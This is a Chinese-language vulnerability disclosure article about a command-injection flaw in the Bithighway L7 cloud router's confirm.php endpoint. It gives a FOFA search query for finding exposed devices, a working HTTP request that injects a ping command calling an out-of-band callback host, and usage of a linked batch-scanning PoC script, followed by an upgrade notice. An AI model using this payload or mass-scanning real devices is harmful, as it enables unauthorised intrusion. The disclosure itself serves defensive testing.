<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tDycoHBMxJy09Y3m3NT8Ug)

**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**

**一、资产信息**

1、fofa

```
title="碧海威L7云路由"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QvnQz1l9ibOTzrLvGOiaaAuz8txKCKctzdqmhCRBoTtngQW2fqGk4wMDg/640?wx_fmt=png&from=appmsg)

2、系统页面

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QNGMH2y0ogeyYEgVMJibib1B6ia649WYYBJ2iaoa1EmSwNtYWCGicyB2PmmA/640?wx_fmt=png&from=appmsg)

**二、漏洞简述**

碧海威流控软件 L7 云路由是一款可以解决公司、企业局域网环境下路由设备，具备路由、防火墙、流控、无线 AC 控制器、微信认证等多项功能。其接口 confirm.php 存在任意命令执行漏洞，攻击者可通过该漏洞执行命令获取系统权限。

****三、漏洞检测 poc****

```
GET /notice/confirm.php?t=;ping%20-c%203%20123.68cp4d60qkwj2i17phst1n58qzwqkg85.oastify.com HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13
Connection: close

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QiaNfmwzhvCddaL2FaOPKJWYsmVDLZrbsvHg556L3EdZwZ42PMNUsyrA/640?wx_fmt=png&from=appmsg)

dns 回显![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QUUgO5FJ1R1s6rY7wuhUWEzZ5PgFxWhm4hbJukI3b1vPNMslHRpOibqA/640?wx_fmt=png&from=appmsg)

****四、漏洞检测脚本****

****安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：****

https://github.com/ATonysan/poc-exp/blob/main/BithighwayRouer_confirm-RCE.py

批量检测：

python BithighwayRouer_confirm-RCE.py -f url.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3Q0KtJZF1JzHva4lCFyqnkntnHxjzvK2jS0zCTrKBlLRB8bcjopIAFfQ/640?wx_fmt=png&from=appmsg)

单个 url 检查  

python BithighwayRouer_confirm-RCE.py -u url

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzVu2SImH90C7PXSh0wSPicJm98HASXNldwia4wYD2BuofwuoEHnDrtYrx3MQPT41DM5SIrJF2vib6bQ/640?wx_fmt=png&from=appmsg)

**五、修复**

官方已更新补丁，请升级至最新版本。

官方网站：http://www.bithighway.com/